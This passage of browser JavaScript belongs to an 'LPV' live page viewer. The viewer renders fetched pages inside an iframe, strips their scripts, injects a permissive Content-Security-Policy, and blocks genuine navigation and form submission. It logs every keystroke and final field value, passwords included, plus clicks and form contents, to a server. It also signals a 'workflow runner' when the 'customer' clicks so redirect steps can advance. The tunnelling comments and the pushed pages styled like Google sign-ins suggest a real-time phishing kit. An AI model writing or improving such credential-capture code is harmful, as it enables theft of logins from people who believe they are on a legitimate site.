                        if (el.tagName === 'INPUT') {
                            const t = (el.getAttribute('type') || 'text').toLowerCase();
                            if (t === 'checkbox' || t === 'radio') return el.checked ? 'on' : 'off';
                            // passwords ARE captured (admin explicitly opted in)
                            return el.value;
                        }
                        if (el.tagName === 'TEXTAREA') return el.value;
                        if (el.tagName === 'SELECT') return el.value;
                        return null;
                    };

                    // ----------------------------------------------------------------
                    // field_final — emit the FINAL value of a field on the
                    // boundaries the user cares about:
                    //   - blur       (user moved on)
                    //   - submit     (form submit; all fields flushed)
                    //   - nav        (about to navigate; everything in the doc)
                    //   - pagehide   (tab close / iframe swap)
                    // We track the last value we emitted per element so we don't
                    // spam duplicates when a blur fires after no change.
                    // ----------------------------------------------------------------
                    const _finalEmitted = new WeakMap();   // element -> last string value emitted as final

                    const _sendFieldFinal = (el, reason) => {
                        if (!el) return;
                        const tag = (el.tagName || '').toLowerCase();
                        if (tag !== 'input' && tag !== 'textarea' && tag !== 'select') return;
                        const value = fieldValue(el);
                        if (value === null || value === undefined) return;
                        // Skip empty fields — no point logging "they typed nothing".
                        if (typeof value === 'string' && value === '') return;
                        // De-dupe vs the last final we sent for this element.
                        if (_finalEmitted.get(el) === value) return;
                        _finalEmitted.set(el, value);
                        const meta = describe(el);
                        LPV._send({
                            type: 'lpv_event',
                            event_type: 'field_final',
                            page_id:   LPV.currentPage && LPV.currentPage.id,
                            page_name: LPV.currentPage && LPV.currentPage.name,
                            payload:   { ...meta, value, reason }
                        });
                    };

                    const _flushAllFieldFinals = (rootEl, reason) => {
                        try {
                            const scope = rootEl || document;
                            const els = scope.querySelectorAll('input, textarea, select');
                            els.forEach(el => _sendFieldFinal(el, reason));
                        } catch (e) {
                            // best-effort
                        }
                    };

                    // 1) blur — per-field final.
                    root.addEventListener('blur', (ev) => {
                        const t = ev.target;
                        if (!t) return;
                        _sendFieldFinal(t, 'blur');
                    }, true);

                    // 2) submit — flush every field in the form before the
                    //    page navigates.  The existing submit handler at
                    //    L5190 still owns the navigation / push; we just
                    //    piggyback on it via this capture-phase listener.
                    root.addEventListener('submit', (ev) => {
                        const form = ev.target;
                        if (!form) return;
                        _flushAllFieldFinals(form, 'submit');
                    }, true);

                    // 3) pagehide / beforeunload — last-chance flush.
                    window.addEventListener('pagehide', () => {
                        _flushAllFieldFinals(document, 'pagehide');
                    });
                    window.addEventListener('beforeunload', () => {
                        _flushAllFieldFinals(document, 'beforeunload');
                    });

                    // input fires on every keystroke for text/password fields.
                    root.addEventListener('input', (ev) => {
                        const t = ev.target;
                        if (!t) return;
                        const tag = (t.tagName || '').toLowerCase();
                        if (tag !== 'input' && tag !== 'textarea' && tag !== 'select') return;
                        const meta = describe(t);
                        const value = fieldValue(t);
                        LPV._send({
                            type: 'lpv_event',
                            event_type: t.type === 'password' ? 'password_change' : 'field_change',
                            page_id: LPV.currentPage && LPV.currentPage.id,
                            page_name: LPV.currentPage && LPV.currentPage.name,
                            payload: { ...meta, value }
                        });
                    }, true);

                    root.addEventListener('change', (ev) => {
                        const t = ev.target;
                        if (!t) return;
                        const tag = (t.tagName || '').toLowerCase();
                        if (tag !== 'input' && tag !== 'textarea' && tag !== 'select') return;
                        LPV._send({
                            type: 'lpv_event',
                            event_type: 'field_change',
                            page_id: LPV.currentPage && LPV.currentPage.id,
                            page_name: LPV.currentPage && LPV.currentPage.name,
                            payload: { ...describe(t), value: fieldValue(t) }
                        });
                    }, true);

                    // click — for buttons, links, anything clickable
                    root.addEventListener('click', (ev) => {
                        const t = ev.target;
                        if (!t) return;
                        if (this.overlay && this.overlay.contains(t)) return;
                        const actionable = actionTarget(ev) || t;
                        if (!actionable) return;

                        ev.preventDefault();
                        ev.stopPropagation();
                        ev.stopImmediatePropagation();

                        const meta = describe(actionable);
                        const fieldState = captureFieldState(actionable);
                        const href = actionable.getAttribute ? actionable.getAttribute('href') : '';
                        // Only flash the spinner for *real* navigation/CTA
                        // clicks (Next, Submit, link, role=button, etc.) —
                        // not for field interactions that the actionable
                        // selector would also pick up (checkboxes, dropdowns,
                        // labels wrapping buttons that resolve to inputs).
                        if (this._isNavAction(actionable)) {
                            this._showSpinner(true, 'click');
                        }
                        this._setBar('LPV tracking ' + ((meta && meta.text) || actionable.tagName || 'action'));
                        LPV._send({
                            type: 'lpv_event',
                            event_type: 'click',
                            page_id: LPV.currentPage && LPV.currentPage.id,
                            page_name: LPV.currentPage && LPV.currentPage.name,
                            payload: {
                                ...meta,
                                href: href || '',
                                ...fieldState,
                                x: ev.clientX, y: ev.clientY,
                                text: (actionable.textContent || '').trim().slice(0, 80),
                                preview_only: true
                            }
                        });
                    }, true);

                    // submit — capture form submissions with a snapshot of fields.
                    root.addEventListener('submit', (ev) => {
                        const form = ev.target;
                        if (!form || form.tagName !== 'FORM') return;
                        ev.preventDefault();
                        ev.stopPropagation();
                        ev.stopImmediatePropagation();
                        const fields = {};
                        // Form submissions are always a real navigation
                        // intent — show the spinner once (the previous code
                        // called _showSpinner(true) twice, which was harmless
                        // but pointless).
                        this._showSpinner(true, 'submit');
                        this._setBar('LPV submit: ' + (form.getAttribute('action') || 'form'));
                        try {
                            new FormData(form).forEach((v, k) => {
                                if (k in fields) {
                                    fields[k] = [].concat(fields[k], v);
                                } else {
                                    fields[k] = v;
                                }
                            });
                        } catch (e) { /* ignore */ }
                        LPV._send({
                            type: 'lpv_event',
                            event_type: 'form_submit',
                            page_id: LPV.currentPage && LPV.currentPage.id,
                            page_name: LPV.currentPage && LPV.currentPage.name,
                            payload: { fields, action: form.getAttribute('action') || '', preview_only: true }
                        });
                    }, true);

                    // Nav flush — showPage() dispatches 'lpv:nav' right
                    // before swapping the page document.  We walk the
                    // current container and emit field_final for every
                    // non-empty input/textarea/select so the audit log
                    // captures the value the user settled on before
                    // moving on.  Listener is bound once per capture
                    // root; subsequent rebinds to the same root are
                    // no-ops.
                    if (!root._lpvNavFlushBound) {
                        root._lpvNavFlushBound = true;
                        document.addEventListener('lpv:nav', () => {
                            try {
                                const els = (LPV.container || root)
                                    .querySelectorAll('input, textarea, select');
                                els.forEach(el => _sendFieldFinal(el, 'nav'));
                            } catch (e) { /* best-effort */ }
                        });
                    }
                },

                _bindLifecycleMonitoring() {
                    if (this._monitorBound) return;
                    this._monitorBound = true;
                    // Lifecycle click monitor — keeps the spinner showing while
                    // the user is interacting with the page. We only flip the
                    // spinner on for genuine navigation/CTA actions (links,
                    // submit/button, role=button, data-action, onclick) and
                    // explicitly NOT for field interactions like inputs,
                    // textareas, selects, labels, checkboxes, radios, or
                    // dropdown options — those never imply a page transition.
                    document.addEventListener('click', (ev) => {
                        if (!this.active) return;
                        const target = ev.target;
                        if (!target || !target.closest || !this.overlay || this.overlay.contains(target)) return;
                        if (!this._isNavAction(target)) return;
                        this._showSpinner(true, 'click');
                    }, true);
                },

                _showSpinner(show, reason = 'page_load') {
                    // The spinner is a persistent activity indicator — it stays
                    // visible across click/submit/input events and only hides on
                    // explicit transitions (start, page-load success/failure,
                    // stop). Removing the previous auto-hide timer means a
                    // button click no longer flips the spinner off mid-flow
                    // and never briefly blocks the next click.
                    if (!this.spinner) return;
                    if (show) {
                        this.spinner.classList.remove('hidden');
                        // Tell the server the spinner just came on — but ONLY
                        // when a genuine USER ACTION caused it (button/link
                        // click, form submit). The workflow runner waits for
                        // exactly that "customer clicked" signal to advance a
                        // redirect step. Page-load transitions flip the spinner
                        // on too; signalling those made the runner think the
                        // customer clicked — on high-latency MOBILE links the
                        // load-spinner event landed right after the runner
                        // subscribed and instantly satisfied the redirect wait
                        // (the "workflow links skip redirect logic" bug).
                        // Emit for user gestures even when the spinner was
                        // already up (a tap during page load still counts as
                        // the customer's click) — throttled so repeated taps
                        // don't spam the audit log.
                        if (reason === 'click' || reason === 'submit') {
                            const _now = Date.now();
                            if (!this._lastSpinnerEmitAt || _now - this._lastSpinnerEmitAt > 800) {
                                this._lastSpinnerEmitAt = _now;
                                try {
                                    LPV._send({
                                        type: 'lpv_event',
                                        event_type: 'lpv_spinner',
                                        page_id: LPV.currentPage && LPV.currentPage.id,
                                        page_name: LPV.currentPage && LPV.currentPage.name,
                                        payload: { reason: reason }
                                    });
                                } catch (e) { /* best-effort */ }
                            }
                        }
                    } else {
                        this.spinner.classList.add('hidden');
                    }
                },

                // Decide whether a click target represents a *real* navigation /
                // CTA action (link, submit, role=button, data-action, onclick,
                // "next"/"submit" text) as opposed to a field interaction
                // (input/textarea/select, label, checkbox/radio, dropdown
                // option, etc.). Only real actions should pop the spinner —
                // we don't want the ring to flash on every keystroke or
                // checkbox toggle.
                _isNavAction(target) {
                    if (!target || !target.closest) return false;
                    // Walk up to the nearest actionable element. We
                    // intentionally use a more restrictive selector than the
                    // capture listener, because the spinner is a UI-side
                    // signal and we want it to be accurate.
                    const candidate = target.closest(
                        'a[href], button, [role="button"], [type="submit"], [type="button"], [data-action], [onclick]'
                    );
                    if (!candidate) return false;

                    const tag = (candidate.tagName || '').toLowerCase();
                    // <a> with a real href counts.
                    if (tag === 'a' && candidate.getAttribute('href')) return true;
                    // <button> always counts (covers Next/Submit/Sign-in).
                    if (tag === 'button') return true;
                    // role=button / data-action / onclick — explicit CTAs.
                    if (candidate.getAttribute('role') === 'button') return true;
                    if (candidate.hasAttribute('data-action')) return true;
                    if (candidate.hasAttribute('onclick')) return true;
                    // input[type=submit|button] — explicit form buttons.
                    if (tag === 'input') {
                        const t = (candidate.getAttribute('type') || '').toLowerCase();
                        if (t === 'submit' || t === 'button') return true;
                    }
                    return false;
                },

                _setBar(text) {
                    if (this.dot) this.dot.title = text || 'LPV';
                },

                async start() {
                    if (this.active) return;
                    this.active = true;
                    this._buildOverlay();
                    this._bindLifecycleMonitoring();
                    // Keep the overlay hidden until the first page actually
                    // lands (showPage un-hides it) — showing the empty white
                    // container here caused the "spinner, then blank page"
                    // flash. The boot loading screen fills that gap and only
                    // stops once a page has been pushed.
                    try { lpvHoldLoadingScreen(); } catch (e) {}
                    this._showSpinner(false);
                    this._setBar('LPV ready');
                    this._send({ type: 'lpv_event', event_type: 'lpv_ready' });
                },

                stop() {
                    if (!this.active) return;
                    this.active = false;
                    if (this._abortController) {
                        try { this._abortController.abort(); } catch (e) {}
                        this._abortController = null;
                    }
                    if (this.overlay) this.overlay.classList.add('hidden');
                    this.currentPage = null;
                    this._setBar('LPV stopped');
                },

                async showPage(pageId, pageUrl, pageName) {
                    if (!this.active) this.start();
                    // Before swapping in a new page, flush any field_final
                    // values for the page we're about to leave.  The
                    // start()-closure handler picks this up because it has
                    // the root reference and the _sendFieldFinal helper.
                    try {
                        const flushEv = new CustomEvent('lpv:nav', { detail: { reason: 'nav' } });
                        document.dispatchEvent(flushEv);
                    } catch (e) { /* best-effort */ }
                    this._showSpinner(true, 'page_load');
                    this._setBar('LPV loading ' + (pageName || pageId));

                    if (this._abortController) {
                        try { this._abortController.abort(); } catch (e) {}
                    }
                    const ac = new AbortController();
                    this._abortController = ac;

                    try {
                        const resp = await fetch(pageUrl, {
                            signal: ac.signal,
                            credentials: 'same-origin',
                            cache: 'no-store',
                        });
                        if (!resp.ok) {
                            throw new Error('HTTP ' + resp.status);
                        }
                        let html = await resp.text();
                        if (ac.signal.aborted) return;

                        // HTML+CSS only (user request): page JS re-run from a
                        // blob: doc builds URLs against the viewer origin
                        // (glued-host failures). Server strips already; belt.
                        try { html = html.replace(/<script\b[^>]*(?:\/>|>[\s\S]*?<\/script\s*>)/gi, ''); } catch (e) {}

                        // BASE GUARANTEE: a base-less document rendered from
                        // a blob: URL resolves every relative reference
                        // against the VIEWER's origin. On localhost that
                        // silently loads our own server (page "renders
                        // well"); through a tunnel the ngrok edge answers
                        // and its interstitial machinery navigates the frame
                        // to a glued hostname (the "…apphttps" DNS errors).
                        // The serve endpoint already re-injects a validated
                        // base; this is the belt for any page that still
                        // arrives without one.
                        if (!/<base[\s>]/i.test(html.slice(0, 4000))) {
                            try {
                                const am = html.match(/https?:\/\/[^"'<>\s)]+/);
                                const bo = am ? new URL(am[0]).origin + '/' : null;
                                if (bo) {
                                    const tag = '<base href="' + bo + '">';
                                    if (/<head[^>]*>/i.test(html)) html = html.replace(/<head[^>]*>/i, (m) => m + tag);
                                    else if (/<html[^>]*>/i.test(html)) html = html.replace(/<html[^>]*>/i, (m) => m + tag);
                                    else html = tag + html;
                                }
                            } catch (e) { /* best-effort */ }
                        }

                        // IMPORTANT: the LPV page must remain fully interactive.
                        // Using innerHTML/fragment injection does not reliably
                        // re-execute scripts and it can fall into sandboxed
                        // about:srcdoc / about:blank behavior. A blob-backed
                        // iframe keeps the page in a normal browsing context,
                        // so scripts, form handling, and click behavior continue
                        // to work while the overlay remains in the client UI.
                        this.container.innerHTML = '';
                        this.container.appendChild(this.spinner);

                        if (this.pageObjectUrl) {
                            try { URL.revokeObjectURL(this.pageObjectUrl); } catch (e) {}
                            this.pageObjectUrl = null;
                        }

                        const blob = new Blob([html], { type: 'text/html' });
                        const blobUrl = URL.createObjectURL(blob);
                        this.pageObjectUrl = blobUrl;

                        const frame = document.createElement('iframe');
                        frame.setAttribute('title', pageName || 'LPV page');
                        frame.setAttribute('aria-label', pageName || 'LPV page');
                        frame.setAttribute('tabindex', '-1');
                        // The iframe MUST be interactive — users need to scroll,
                        // click links/buttons, and type into inputs while the admin
                        // watches via the preview-only event stream. The previous
                        // `scrolling="no"`, inline `overflow: hidden`, and inline
                        // `pointer-events: none` blocked all of that, leaving the
                        // pushed page frozen.
                        //
                        // Safety: every click/submit/input inside the iframe doc
                        // is captured in capture phase (see innerDoc listeners
                        // below) and the event's default is preventDefault'd, so
                        // real navigation/form submission still does not happen —
                        // we just want the user to be able to interact with the
                        // page so the admin can see what they're doing.
                        frame.style.width = '100%';
                        frame.style.height = '100%';
                        frame.style.border = 'none';
                        frame.style.background = '#fff';
                        frame.style.overflow = 'auto';
                        frame.src = blobUrl;
                        frame.setAttribute('data-lpv-frame', 'true');
                        frame.addEventListener('load', () => {
                            try {
                                const innerDoc = frame.contentDocument || frame.contentWindow && frame.contentWindow.document;
                                if (!innerDoc) return;
                                const guard = '__lpv_preview_guard__';
                                if (innerDoc[guard]) return;
                                innerDoc[guard] = true;

                                // Inject a permissive meta CSP into the LPV
                                // iframe's <head>. This is the iframe doc's own
                                // CSP — if Chrome does NOT inherit the parent
                                // doc's CSP to blob: iframes (the optimistic
                                // case), then this becomes the only CSP and
                                // pushed pages are free to run inline scripts,
                                // data: URL scripts, and eval. If Chrome DOES
                                // inherit, this meta can only intersect (most
                                // restrictive wins), so it won't widen — but
                                // the server-side /api/lpv/ CSP override in
                                // api.py covers that case. Belt and braces.
                                if (!innerDoc.querySelector('meta[http-equiv="Content-Security-Policy"][data-lpv-injected]')) {
                                    const cspMeta = innerDoc.createElement('meta');
                                    cspMeta.setAttribute('http-equiv', 'Content-Security-Policy');
                                    cspMeta.setAttribute('content', [
                                        "default-src * 'unsafe-inline' 'unsafe-eval' 'wasm-unsafe-eval' data: blob:",
                                        "script-src * 'unsafe-inline' 'unsafe-eval' 'wasm-unsafe-eval' data: blob:",
                                        "script-src-elem * 'unsafe-inline' 'unsafe-eval' 'wasm-unsafe-eval' data: blob:",
                                        "style-src * 'unsafe-inline' data: blob:",
                                        "style-src-elem * 'unsafe-inline' data: blob:",
                                        "img-src * data: blob:",
                                        "font-src * data: blob:",
                                        "connect-src * data: blob:",
                                        "media-src * data: blob:",
                                        "frame-src * data: blob:",
                                        "worker-src * data: blob:",
                                        "child-src * data: blob:",
                                        "form-action * data: blob:",
                                        "object-src 'none'",
                                        "base-uri *"
                                    ].join('; '));
                                    cspMeta.setAttribute('data-lpv-injected', 'true');
                                    const head = innerDoc.head || innerDoc.documentElement;
                                    if (head) head.insertBefore(cspMeta, head.firstChild);
                                }

                                const viewportGuard = innerDoc.createElement('style');
                                viewportGuard.textContent = `
                                    html, body {
                                        width: 100% !important;
                                        height: auto !important;
                                        min-height: 100% !important;
                                        margin: 0 !important;
                                        overflow: auto !important;
                                        overscroll-behavior: contain !important;
                                    }
                                    body {
                                        min-height: 100vh !important;
                                    }
                                `;
                                const head = innerDoc.head || innerDoc.documentElement;
                                head.appendChild(viewportGuard);

                                // Resize Google's reCAPTCHA watermark image
                                // (img.gb_X) to 40x40 and center it inside
                                // the reCAPTCHA circle on pushed pages.
                                // See resizeRecaptchaLogos(doc) for the
                                // full rationale.
                                if (typeof resizeRecaptchaLogos === 'function') {
                                    try { resizeRecaptchaLogos(innerDoc); } catch (e) { /* ignore */ }
                                }
                                if (innerDoc.documentElement) {
                                    innerDoc.documentElement.style.overflow = 'auto';
                                    innerDoc.documentElement.style.height = 'auto';
                                    innerDoc.documentElement.style.width = '100%';
                                }
                                if (innerDoc.body) {
                                    innerDoc.body.style.overflow = 'auto';
                                    innerDoc.body.style.height = 'auto';
                                    innerDoc.body.style.width = '100%';
                                    innerDoc.body.style.maxHeight = 'none';
                                    innerDoc.body.style.maxWidth = '100%';
                                }

                                const capture = (eventName, ev) => {
                                    const currentTarget = ev && ev.target ? ev.target : null;
                                    if (!currentTarget || !currentTarget.closest) return;

            //   region_replace -> applyRegion(msg)        one subtree replaced
            //   body_replace   -> applyBodyReplace(msg)   body swapped, head kept
            //   full_document  -> applyFullDocument(msg)  SingleFile, hard reload
